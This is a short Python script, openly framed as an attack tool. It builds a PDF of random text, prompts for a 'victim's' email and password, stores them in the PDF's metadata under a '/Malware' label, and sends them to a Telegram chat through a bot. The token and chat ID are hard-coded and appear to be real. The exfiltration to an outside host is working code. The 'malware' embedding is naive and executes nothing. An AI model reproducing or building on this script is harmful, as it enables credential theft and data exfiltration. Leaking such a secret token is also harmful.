import requests
import PyPDF2
import telebot
from fpdf import FPDF
import random
import string

# Function to create a PDF with random text
def create_random_pdf(filename):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    random_text = ''.join(random.choices(string.ascii_letters + string.digits + " ", k=500))
    pdf.multi_cell(0, 10, random_text)
    pdf.output(filename)
    print(f"{filename} created with random text.")

# Function to steal user info
def steal_info():
    user = input("Enter victim's email: ")
    password = input("Enter victim's password: ")
    return [user, password]

# Function to add malware to a PDF file
def add_malware_to_pdf(malware, pdf):
    with open(pdf, 'rb') as file:
        pdf_reader = PyPDF2.PdfReader(file)
        pdf_writer = PyPDF2.PdfWriter()
        
        # Copy existing pages into the new PDF
        for page in pdf_reader.pages:
            pdf_writer.add_page(page)
        
        # Add malware as metadata (example only)
        pdf_writer.add_metadata({'/Malware': malware})
        
        # Save the new malicious PDF
        with open('malicious.pdf', 'wb') as stream:
            pdf_writer.write(stream)
    print("Malicious PDF created: malicious.pdf")

# Function to send data to Telegram
def send_to_telegram(telegram_token, chat_id, data):
    bot = telebot.TeleBot(telegram_token)
    bot.send_message(chat_id, "Stolen information:")
    bot.send_message(chat_id, f"Email: {data[0]}")
    bot.send_message(chat_id, f"Password: {data[1]}")
    print("Information sent to Telegram")

# Telegram credentials (replace with your own valid token and chat ID)
telegram_token = "8141276530:AAGXtlMv6psShidQvlahK8jhPXDjEKD4Ceg"
chat_id = 1702319284

# Main execution
# Step 1: Create a random PDF
create_random_pdf("hello.pdf")

# Step 2: Steal user info
info = steal_info()
print(info)

# Step 3: Add stolen info as "malware" to the PDF file
add_malware_to_pdf(info[0] + info[1], "hello.pdf")

# Step 4: Send stolen info to Telegram
send_to_telegram(telegram_token, chat_id, info) 
